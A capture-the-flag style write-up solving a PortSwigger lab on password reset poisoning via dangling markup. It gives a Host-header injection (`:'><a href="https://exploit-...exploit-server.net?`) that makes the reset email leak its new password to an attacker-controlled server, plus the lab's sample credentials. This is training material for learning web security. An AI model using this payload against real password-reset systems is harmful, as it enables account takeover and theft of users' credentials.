# Lab: Password reset poisoning via dangling markup

This lab is vulnerable to password reset poisoning via [dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup). To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server. 

## Hint

Some antivirus software scans links in emails to identify whether they are malicious. 

## Solution

In this lab, when you reset your password a new random password will be sent to your email. To solve this lab we need to read email contain password reset of `carlos`.

Some solutions in previous lab aren't available. Like change Host header or add X-Forwarded-Host header.

- With change Host header response returns 504 Gateway Timeout
- With X-Forwarded-Host header we send request contain our domain, which under control by us. But in the email the url to redirect to reset password still real url not mine, but even if it's our url, it won't return the new password after the bot scans it, because we only can read access log :<

Observe the raw email we see a tag contain attribute `href` with value is Host header in request which we can modify (this is the sign of dangling markup injection).

![](https://i.imgur.com/3fsAyaO.png)

Trying modify the Host header with add `'>` (we user `'` because the application use `'` to open href in a tag) at the end of url to close a tag but it not works

![](https://i.imgur.com/fEU8X0m.png)

Continue modifying the Host header but this time we inject with the injected part located in the port of url like that `Host: 0a7400eb0428b08fc03c3bbf004c0070.web-security-academy.net:'>`

It works

![](https://i.imgur.com/dm7aKxx.png)

Let check the email to see difference.

![](https://i.imgur.com/e1BmZPP.png)
![](https://i.imgur.com/nzvLGzR.png)

We had injected successfully. Trying create a new a tag pointing to our server with parameter of href attribute is the rest of the email. Like that: `:'><a href="https://exploit-0acb008a04efb064c0663a260169001d.exploit-server.net?`

![](https://i.imgur.com/Ae75tKc.png)

Attributes href in new a tag we use `"` to bypass the `'` close href attribute of old a tag. So that the parameter will be all the rest of the email according to we will.

![](https://i.imgur.com/13WwwKa.png)
![](https://i.imgur.com/WKSFKsq.png)

Then check in the access log because the some antivirus software scans that link following the hint.

![](https://i.imgur.com/vnnxEUu.png)

We got the new password. 

Now change parameter username from `wiener` to `carlos` and send request.

![](https://i.imgur.com/vF6vPuh.png)

After that check in the access log

![](https://i.imgur.com/U7uvstH.png)

So we have the new carlos password, login with `carlos:AIOKKGQldi` credentials to solve this lab.